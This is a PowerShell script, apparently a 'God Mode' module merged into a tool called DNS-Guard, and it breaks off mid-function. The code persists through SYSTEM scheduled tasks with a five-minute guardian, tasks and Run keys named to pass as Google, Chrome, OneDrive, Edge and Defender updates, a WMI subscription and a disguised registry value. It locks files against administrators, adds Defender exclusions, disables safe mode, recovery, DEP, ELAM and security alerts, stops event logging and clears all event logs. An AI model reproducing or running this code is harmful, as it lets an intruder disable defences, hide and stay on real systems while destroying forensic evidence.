    Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow

    # Gate: prevent overwrite
    if (Test-Path $GodModeInstallDir) {
        Write-Log -Message "Installation aborted: $GodModeInstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$GodModeTaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }

    # 1. Secure copy
    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
    Write-Log -Message "Payload copied to $GodModeInstallScript." -Type "INFO" -Color Gray

    # 2. Build wrapper
    $WrapperContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" %*"
    $WrapperLocal = Join-Path $GodModeInstallDir "godmode.cmd"
    Out-File -FilePath $WrapperLocal -InputObject $WrapperContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $WrapperLocal." -Type "INFO" -Color Gray

    # 3. Integrity hash
    $ScriptHash = (Get-FileHash -Path $GodModeInstallScript -Algorithm SHA256).Hash
    $GodModeIntegrityFile = Join-Path $GodModeInstallDir "integrity.sha256"
    Set-Content -Path $GodModeIntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash written." -Type "INFO" -Color Gray

    # 4. NTFS hardening
    Write-Log -Message "Hardening NTFS on God Mode directory..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        Write-Log -Message "God Mode directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS: $_" -Type "ERROR" -Color Red
    }

    # 5. Global CLI
    Out-File -FilePath $GodModeCmdPath -InputObject $WrapperContent -Encoding ASCII -Force
    if (-not (Test-Path $GodModeCmdPath)) {
        Write-Log -Message "CRITICAL: godmode wrapper not created at $GodModeCmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $GodModeCmdPath." -Type "SUCCESS" -Color Green
    }

    # 6. PATH
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$GodModeInstallDir*") {
            $NewPath = $CurrentPath + ";" + $GodModeInstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $GodModeInstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$GodModeInstallDir already in PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update PATH: $_" -Type "ERROR" -Color Red
    }

    # 7. Harden wrapper
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($GodModeCmdPath, $WrapperLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked." -Type "SUCCESS" -Color Green

    # 8. Main task: auto-enable God Mode at logon if flag exists
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Main God Mode task registered." -Type "INFO" -Color Gray

    # 9. Guardian: re-apply every 5 minutes if flag exists
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "God Mode guardian registered (5-min heartbeat)." -Type "INFO" -Color Gray

    # 10. Integrity in registry (misleading key)
    $GodModeIntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $GodModeIntegrityRegPath)) { New-Item -Path $GodModeIntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeIntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray

    Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "EXIT" -Message "Success"

    # Final verification
    $FailedCount = 0
    if (-not (Test-Path $GodModeInstallDir)) { $FailedCount++; Write-Log -Message "Install dir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeInstallScript)) { $FailedCount++; Write-Log -Message "Install script missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeCmdPath)) { $FailedCount++; Write-Log -Message "Global CLI missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH missing." -Type "ERROR" -Color Red }
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] GOD MODE INSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
    }
}

function Uninstall-GodModePersistence {
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "ENTRY"
    $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling God Mode from System..." -Type "ACTION" -Color Yellow
    Disable-GodMode

    # Remove tasks
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed main task $GodModeTaskName." -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeGuardianName -Confirm:$false | Out-Null
        Write-Log -Message "Removed guardian $GodModeGuardianName." -Type "INFO" -Color Gray
    }

    # Remove backup tasks
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # Remove registry persistence
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    # Remove global CLI
    if (Test-Path $GodModeCmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $GodModeCmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $GodModeCmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop
        } catch {
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$GodModeCmdPath`" & icacls.exe `"$GodModeCmdPath`" /reset & cmd /c del /f /q `"$GodModeCmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeCmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeCmdPath) {
            Write-Log -Message "Failed to remove godmode CLI." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed godmode CLI." -Type "INFO" -Color Gray
        }
    }

    # Remove PATH entry
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$GodModeInstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $GodModeInstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $GodModeInstallDir from PATH." -Type "INFO" -Color Gray
        }
    } catch { Write-Log -Message "Failed to clean PATH: $_" -Type "ERROR" -Color Red }

    # Remove install dir
    if (Test-Path $GodModeInstallDir) {
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $GodModeInstallScript) {
            cmd /c "del /f /q `"$GodModeInstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $GodModeInstallDir. Trying SYSTEM cleanup..." -Type "INFO" -Color Yellow
            $SystemCmd = "cmd /c del /f /q `"$GodModeInstallScript`" 2>nul & cmd /c rd /s /q `"$GodModeInstallDir`" 2>nul"
            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeInstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeInstallDir) {
            Write-Log -Message "SYSTEM cleanup failed: $GodModeInstallDir still exists." -Type "ERROR" -Color Red
            if (Test-Path $GodModeInstallScript) {
                Write-Log -Message "GodMode.ps1 still exists inside install dir." -Type "ERROR" -Color Red
            }
        } else {
            Write-Log -Message "God Mode directory removed." -Type "INFO" -Color Gray
        }
    }

    # Final verification
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GodModeTaskName still exists." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Guardian $GodModeGuardianName still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeInstallDir) { $FailedCount++; Write-Log -Message "Install dir $GodModeInstallDir still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeCmdPath) { $FailedCount++; Write-Log -Message "CLI $GodModeCmdPath still exists." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH still contains $GodModeInstallDir." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] GOD MODE UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
    }
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "EXIT" -Message "Complete"
}

function Uninstall-Persistence {
    # Exit early if nothing is installed
    $IsInstalled = (Test-Path $InstallDir) -or (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] DNS-Guard is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling DNS-Guard from System..." -Type "ACTION" -Color Yellow

    # GPO registry cleanup is handled by Disable-DNSLock; no separate ACL relaxation needed

    # Unlock the network FIRST (so it can safely write to the log file)
    Disable-DNSLock

    # Remove the Scheduled Tasks (including both guardians)
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $Guardian2Name = "Windows-Defender-AM-Updates"
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Background Task: $TaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GuardianTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 1: $GuardianTaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $Guardian2Name -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 2: $Guardian2Name" -Type "INFO" -Color Gray
    }

    # Remove WMI Event Subscription
    Write-Log -Message "Removing WMI event subscription..." -Type "INFO" -Color Gray
    try {
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%WindowsUpdateHealthCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove WMI subscription: $_" -Type "WARN" -Color Yellow }
    
    # Remove the integrity hash registry key
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (Test-Path $IntegrityRegPath) {
        Remove-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction SilentlyContinue
    }

    # Remove Global CLI Command (relax ACL first) - then delete via SYSTEM helper if needed
    if (Test-Path $CmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $CmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $CmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $CmdPath -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $CmdPath. Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$CmdPath`" & icacls.exe `"$CmdPath`" /reset & cmd /c del /f /q `"$CmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $CmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $CmdPath) {
            Write-Log -Message "Failed to remove 'dnslock' CLI Alias at $CmdPath." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed 'dnslock' CLI Alias." -Type "INFO" -Color Gray
        }
    }

    # Remove local wrapper and PATH entry
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { Remove-Item -Path $CmdPathLocal -Force -ErrorAction SilentlyContinue }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$InstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $InstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $InstallDir from system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to clean system PATH: $_" -Type "ERROR" -Color Red
    }
    
    # Delete System Directory LAST - use SYSTEM helper if direct deletion fails (hardened ACLs)
    if (Test-Path $InstallDir) {
        Write-Log -Message "Removing hardened installation directory..." -Type "INFO" -Color Gray
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $InstallScript) {
            cmd /c "del /f /q `"$InstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop
            Write-Log -Message "Installation directory removed." -Type "INFO" -Color Gray
        } catch {
            Write-Log -Message "Direct deletion failed (hardened ACLs). Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $SystemCmd = "cmd /c del /f /q `"$InstallScript`" 2>nul & cmd /c rd /s /q `"$InstallDir`" 2>nul"
            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $InstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
            if (Test-Path $InstallDir) {
                Write-Log -Message "SYSTEM cleanup failed: $InstallDir still exists." -Type "ERROR" -Color Red
                Write-Log -Message "[DEBUG] Directory contents: $(Get-ChildItem -Path $InstallDir -Force | Select-Object Name | Out-String)" -Type "ERROR" -Color Red
            } else {
                Write-Log -Message "Installation directory removed by SYSTEM. Goodbye!" -Type "INFO" -Color Gray
            }
        }
    }

    # Final status verification: check if any artifacts still remain
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $TaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GuardianTaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $Guardian2Name still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $InstallDir) { $FailedCount++; Write-Log -Message "Install directory $InstallDir still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $CmdPath) { $FailedCount++; Write-Log -Message "Global CLI $CmdPath still exists after uninstall." -Type "ERROR" -Color Red }
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { $FailedCount++; Write-Log -Message "Local wrapper $CmdPathLocal still exists after uninstall." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH still contains $InstallDir after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $IntegrityRegPath) { Write-Log -Message "Registry key $IntegrityRegPath still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiFilter) { Write-Log -Message "WMI event filter still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiConsumer) { Write-Log -Message "WMI event consumer still exists after uninstall." -Type "WARN" -Color Yellow }

    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed to remove)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 7. GOD MODE MODULE (MERGED FROM God mode.ps1)
# ============================================================================
# WARNING: These functions disable Windows security features and are extremely
# dangerous. Only the Built-in Administrator account may use them.
# ============================================================================

function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return ($sid -like "*-500")
}

function Test-SystemContext {
    Write-Host "`n[VERIFY] Running whoami as SYSTEM..." -ForegroundColor Cyan
    $Result = Invoke-AsSystem -Command "whoami & whoami /groups"
    if ($Result.Success -and $Result.Output) {
        Write-Host "[SUCCESS] SYSTEM context verified:" -ForegroundColor Green
        Write-Host $Result.Output -ForegroundColor Green
    } else {
        Write-Host "[FAIL] Could not verify SYSTEM context." -ForegroundColor Red
        if ($Result.Output) { Write-Host "Output: $($Result.Output)" -ForegroundColor Yellow }
    }
    Write-Host "`n[NOTE] Your current session runs as Administrator. God Mode does not change your user account." -ForegroundColor DarkGray
    Write-Host "       The SYSTEM context is only used for background tasks and hardened cleanup operations." -ForegroundColor DarkGray
}

function Get-CurrentUserSidInfo {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    $isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $adminCheck = $isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    return [PSCustomObject]@{ SID = $sid; IsAdmin = $adminCheck; IsBuiltInAdmin = ($sid -like "*-500") }
}

# --- Helper: Add Defender Exclusion ---
function Add-DefenderExclusion {
    param([string]$Path)
    try {
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Add-MpPreference not available; skipped Defender exclusion for $Path." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to add Defender exclusion for $Path`: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Safe Mode / Recovery ---
function Disable-RecoveryAndSafeMode {
    try {
        bcdedit /set {current} safeboot minimal /f 2>$null | Out-Null
        bcdedit /set {current} bootstatuspolicy ignoreallfailures /f 2>$null | Out-Null
        bcdedit /set {current} recoveryenabled No /f 2>$null | Out-Null
        bcdedit /set {current} nx AlwaysOff /f 2>$null | Out-Null
        cmd /c "reagentc.exe /disable" 2>$null | Out-Null
        Write-Log -Message "Safe Mode and Recovery disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "BCD edit failed: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Suppress Security Center Alerts ---
function Disable-SecurityAlerts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Security Center alerts suppressed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to suppress security alerts: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Early Launch Anti-Malware ---
function Disable-ELAM {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -Value 3 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "ELAM boot driver policy disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable ELAM: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Security Auditing / Clear Logs ---
function Disable-SecurityAuditing {
    try {
        Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "EventLog" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "CryptSvc" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "CryptSvc" -StartupType Disabled -ErrorAction SilentlyContinue
        wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null | Out-Null }
        Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger" -ErrorAction SilentlyContinue | ForEach-Object {
            Set-ItemProperty -Path $_.PSPath -Name "Start" -Value 0 -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "Security auditing disabled and event logs cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable security auditing: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: WMI File-less Persistence ---
function Register-GodModeWMI {
    try {
        $WmiName = "Win32ProviderHealthCheck"
